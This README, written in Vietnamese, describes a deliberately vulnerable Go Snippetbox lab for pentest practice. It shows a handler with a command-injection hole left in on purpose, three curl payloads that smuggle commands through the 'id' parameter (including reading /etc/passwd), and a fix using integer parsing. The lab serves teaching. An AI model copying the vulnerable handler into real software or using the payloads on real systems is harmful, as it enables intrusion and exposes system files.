Snippetbox powered by Go (RCE vulnerable lab version) - made by Khanh
---

# Vulnerable Snippetbox: OS Command Injection (RCE) Lab

Dự án này là một phiên bản mở rộng của ứng dụng **Snippetbox** (viết bằng Golang). Nó bao gồm các tính năng tiêu chuẩn của một web app và được cố tình cấy thêm lỗ hổng **OS Command Injection (Remote Code Execution - RCE)** để phục vụ mục đích học tập và thực hành Pentest.

**CẢNH BÁO:** Dự án này chứa lỗ hổng bảo mật nghiêm trọng. Chỉ sử dụng trong môi trường an toàn (Docker/Localhost).

---

## Giới thiệu & Tính năng (Features)

Snippetbox là một ứng dụng web cho phép người dùng chia sẻ các đoạn văn bản hoặc mã nguồn (tương tự như Pastebin). Các tính năng chính bao gồm:

* **Trang chủ (Home):** Hiển thị danh sách các Snippet mới nhất.
* **Xem Snippet (View):** Đọc nội dung chi tiết của một Snippet thông qua ID.
* **Xác thực người dùng (Authentication):** Đăng ký (Signup), Đăng nhập (Login), Đăng xuất (Logout) an toàn với phân quyền (Session).
* **Tạo Snippet (Create):** Tính năng được bảo vệ, chỉ user đã đăng nhập mới có thể tạo mới Snippet.
* **Backup Snippet (Vulnerable Feature):** Tính năng mô phỏng việc sao lưu dữ liệu. Người dùng nhập ID để server chạy lệnh nén hoặc ghi log dưới nền hệ điều hành.

---

## Cài đặt & Khởi chạy

Dự án đã được đóng gói sẵn bằng Docker. Chỉ cần mở Terminal và chạy:

```bash
docker compose up --build

```

*Truy cập ứng dụng tại: `http://localhost:4000*`

---

## Phân tích lỗ hổng (The Vulnerability)

Lỗ hổng nằm tại endpoint `GET /snippet/backup/run`.

Tại giao diện Frontend (`backup.html`), ô nhập ID được cấu hình là `<input type="number">`. Điều này ngăn chặn người dùng bình thường gõ chữ cái hay ký tự đặc biệt vào form.

**Tuy nhiên, đây chỉ là phòng thủ Client-side (Frontend).**

Dưới Backend (file `cmd/web/handlers.go`), server nhận tham số `id` trực tiếp từ URL và nhúng thẳng vào lệnh hệ thống (`exec.Command`) mà không hề ép kiểu hay kiểm tra tính hợp lệ (Server-side Validation):

```go
// 1. Lấy chuỗi ID từ URL (Bỏ qua hoàn toàn cái form HTML)
id := r.URL.Query().Get("id")

// 2. Nối chuỗi trực tiếp vào lệnh Shell Linux
commandString := fmt.Sprintf("echo Dang backup snippet ID: %s", id)

// 3. Thực thi mù quáng
cmd := exec.Command("sh", "-c", commandString)

```

---

## Hướng dẫn Khai thác (Exploitation)

Vì Frontend đã chặn nhập chữ bằng `type="number"`, Hacker sẽ **bỏ qua giao diện (Bypass UI)** và tấn công trực tiếp vào API của Server thông qua thanh địa chỉ (Direct URL) hoặc Terminal (`curl`).

Để chèn thêm lệnh Linux (như `whoami`, `ls`), chúng ta sử dụng dấu chấm phẩy `;` (ngắt lệnh). Tuy nhiên, cơ chế bảo mật của Golang 1.17+ sẽ chặn dấu `;` trên URL thô, nên chúng ta phải **URL Encode** nó thành `%3B`. Khoảng trắng được encode thành `%20`.

**Kịch bản 1: Đọc tên User hệ thống (whoami)**
Mở tab mới trên trình duyệt và dán đường link này (hoặc chạy bằng cURL):

```bash
curl "http://localhost:4000/snippet/backup/run?id=1%3Bwhoami"

```

*Kết quả:* Máy chủ sẽ in ra chữ `root` (hoặc tên user trong Docker container).

**Kịch bản 2: Liệt kê danh sách file mã nguồn (ls -la)**

```bash
curl "http://localhost:4000/snippet/backup/run?id=1%3B%20ls%20-la"

```

**Kịch bản 3: Đọc file nhạy cảm của hệ điều hành Linux (cat /etc/passwd)**

```bash
curl "http://localhost:4000/snippet/backup/run?id=1%3B%20cat%20/etc/passwd"

```

---

## Cách khắc phục (Remediation)

Bài học rút ra: **Giao diện HTML (`type="number"`) chỉ nâng cao trải nghiệm người dùng, không có tác dụng bảo mật. Mọi chốt chặn phải đặt ở Backend.**

Để vá triệt để RCE trong trường hợp này, Backend phải ép dữ liệu nhận được sang kiểu số nguyên (`int`).

```go
import "strconv"

func (app *application) snippetBackupRun(w http.ResponseWriter, r *http.Request) {
    idStr := r.URL.Query().Get("id")

    // KIỂM TRA MẶT SERVER (Server-side Validation)
    id, err := strconv.Atoi(idStr)
    if err != nil || id < 1 {
        // Hacker gửi "?id=1;whoami" -> Ép kiểu thất bại -> Bị chặn đứng tại đây!
        app.clientError(w, http.StatusBadRequest)
        return 
    }

    // Biến 'id' lúc này đã là số nguyên (int), an toàn tuyệt đối
    commandString := fmt.Sprintf("echo Dang backup snippet ID: %d", id) 
    cmd := exec.Command("sh", "-c", commandString)
    // ...
}

```

---



